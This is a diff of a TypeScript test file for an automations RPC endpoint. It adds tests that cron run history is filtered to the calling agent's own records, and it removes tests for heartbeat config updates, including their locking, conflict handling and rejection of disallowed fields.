+    const jobs = [job(), job({ id: "foreign-owned", owner: { agentId: "bob", accountId: "bob-coach" } })];
+    const records = [
+      { agentId: AGENT, entry: { jobId: "daily", ts: 10, summary: "Own sessionless pre-model failure", status: "error" } },
+      { agentId: "octogee-bob-coach", entry: { jobId: "daily", ts: 20, summary: "Private earlier foreign execution", status: "error" } },
+      { agentId: undefined, entry: { jobId: "daily", ts: 30, summary: "Unattributed history", status: "error" } },
+      { agentId: AGENT, entry: { jobId: "foreign-owned", ts: 40, summary: "Foreign owner's job executed here", status: "ok" } },
+    ];
+    const invoke = vi.fn(async (method: string, params: Record<string, unknown>) => {
+      if (method === "cron.list") return page(jobs, params);
+      const entries = records.filter((row) => params.scope === "all"
+        ? params.agentId === undefined || row.agentId === params.agentId
+        : row.entry.jobId === params.id).map((row) => row.entry);
+      return { entries, total: entries.length, offset: 0, limit: 200, hasMore: false, nextOffset: null };
     });
     const { app } = appForTest({ invoke });
-
-    const response = await request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .send({
-        method: "heartbeat.update",
-        baseHash: "before-hash",
-        heartbeat: {
-          every: "60m",
-          prompt: "Check the release queue.",
-          target: "last",
-          lightContext: true,
-        },
-      });
-
+    const response = await rpc(app, "cron.runs", { scope, ...(scope === "job" ? { id: "daily" } : {}), limit: 1 });
     expect(response.status).toBe(200);
-    expect(invoke).toHaveBeenNthCalledWith(1, "config.get", {});
-    expect(invoke).toHaveBeenNthCalledWith(2, "config.patch", {
-      raw: JSON.stringify({
-        agents: {
-          list: [{
-            id: "octogee-alice-coach",
-            heartbeat: {
-              every: "60m",
-              prompt: "Check the release queue.",
-              target: "last",
-              lightContext: true,
-              model: null,
-              directPolicy: null,
-              futureSensitiveField: null,
-            },
-          }],
-        },
-      }),
-      baseHash: "before-hash",
-    });
+    expect(response.body.result).toMatchObject({ entries: [records[0].entry], total: 1, hasMore: false, nextOffset: null, hostedCapabilities: { daily: { history: true } } });
+    expect(JSON.stringify(response.body)).not.toContain("Private earlier");
+    expect(JSON.stringify(response.body)).not.toContain("Unattributed");
+    expect(JSON.stringify(response.body)).not.toContain("Foreign owner's");
+    expect(invoke).toHaveBeenCalledWith("cron.runs", expect.objectContaining({ scope: "all", agentId: AGENT }));
+  });
+  it("returns history capability metadata for each returned job even when it was not in the jobs page", async () => {
+    const jobs = [job(), job({ id: "second" })];
+    const { app } = appForTest({ invoke: async (method, params) => method === "cron.list" ? page(jobs, params) : { entries: [{ jobId: "second", ts: 20 }, { jobId: "daily", ts: 10 }], total: 2, offset: 0, limit: 200, hasMore: false, nextOffset: null } });
+    const listed = await rpc(app, "cron.list", { limit: 1 });
+    expect(listed.body.result.hostedCapabilities).toEqual({ daily: { history: true } });
+    const runs = await rpc(app, "cron.runs", { scope: "all", limit: 1 });
+    expect(runs.body.result).toMatchObject({ total: 2, hasMore: true, nextOffset: 1, hostedCapabilities: { second: { history: true } } });
   });
 
-  it("rejects a heartbeat update whose editor hash no longer matches the current config", async () => {
-    const { app, invoke } = appForTest();
-
-    const response = await request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .send({
-        method: "heartbeat.update",
-        baseHash: "before-hash",
-        heartbeat: { every: "60m" },
-      });
-
-    expect(response.status).toBe(409);
-    expect(response.body).toEqual({ error: "config_changed" });
-    expect(invoke).toHaveBeenCalledTimes(1);
-    expect(invoke).toHaveBeenCalledWith("config.get", {});
-  });
-
-  it("rejects heartbeat updates while the durable config writer lock is busy", async () => {
-    const { app, invoke, openclawDir } = appForTest();
-    const held = await acquireSystemConfigMutationLease({ openclawDir });
-    expect(held.ok).toBe(true);
-
-    const response = await request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .send({
-        method: "heartbeat.update",
-        baseHash: "before-hash",
-        heartbeat: { every: "60m" },
-      });
-
-    expect(response.status).toBe(500);
-    expect(invoke).not.toHaveBeenCalled();
-    if (held.ok) await held.lease.release();
-  });
-
-  it("applies heartbeat updates through a leftover roll-era freeze marker — the freeze plane is retired", async () => {
-    const { app, invoke, openclawDir } = appForTest();
-    fs.writeFileSync(path.join(openclawDir, "system_config.freeze.json"), JSON.stringify({
-      migrationId: "mig-1",
-      slug: "alice",
-      directoryMode: 0o700,
-      configMode: 0o600,
-    }));
-
-    const response = await request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .send({
-        method: "heartbeat.update",
-        baseHash: "config-hash",
-        heartbeat: { every: "60m" },
-      });
-
-    expect(response.status).toBe(200);
-    expect(invoke).toHaveBeenCalledWith("config.patch", expect.anything());
-  });
-
-  it("holds the durable writer lease through the awaited heartbeat patch", async () => {
-    let resolvePatch: ((value: { ok: true; hash: string }) => void) | undefined;
-    const invoke = vi.fn((method: string) => {
-      if (method === "config.get") {
-        return Promise.resolve({
-          hash: "before-hash",
-          config: {
-            agents: {
-              list: [{
-                id: "octogee-alice-coach",
-                heartbeat: { every: "30m" },
-              }],
-            },
-          },
-        });
-      }
-      return new Promise<{ ok: true; hash: string }>((resolve) => {
-      resolvePatch = resolve;
-      });
-    });
-    const { app, openclawDir } = appForTest({ invoke });
-
-    const pending = request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .send({
-        method: "heartbeat.update",
-        baseHash: "before-hash",
-        heartbeat: { every: "60m" },
-      })
-      .then((response) => response);
-    await vi.waitFor(() => expect(invoke).toHaveBeenCalledWith("config.patch", expect.anything()));
-    await expect(acquireSystemConfigMutationLease({ openclawDir })).resolves.toEqual({
-      ok: false,
-      code: "writer-lock-busy",
-    });
-    resolvePatch?.({ ok: true, hash: "next-hash" });
-    expect((await pending).status).toBe(200);
-    const after = await acquireSystemConfigMutationLease({ openclawDir });
-    expect(after.ok).toBe(true);
-    if (after.ok) await after.lease.release();
-  });
-
-  it.each(["accountId", "to", "model", "session"])(
-    "rejects sensitive heartbeat field %s outside the Automation editor contract",
-    async (field) => {
-      const { app, invoke } = appForTest();
-
-      const response = await request(app)
-        .post("/api/g/gw-alice/automations/rpc")
-        .send({
-          method: "heartbeat.update",
-          baseHash: "before-hash",
-          heartbeat: { every: "60m", [field]: "attacker-controlled" },
-        });
-
-      expect(response.status).toBe(400);
-      expect(invoke).not.toHaveBeenCalled();
-    },
-  );
-
-  it("rejects heartbeat fields outside the narrow Automation editor contract", async () => {
-    const { app, invoke } = appForTest();
-
-    const response = await request(app)
-      .post("/api/g/gw-alice/automations/rpc")
-      .send({
-        method: "heartbeat.update",
-        baseHash: "before-hash",
-        heartbeat: { every: "60m", dangerousGatewaySetting: true },
-      });
-
-    expect(response.status).toBe(400);
-    expect(invoke).not.toHaveBeenCalled();
-  });
 });
 
 describe("local Automations OpenClaw transport", () => {
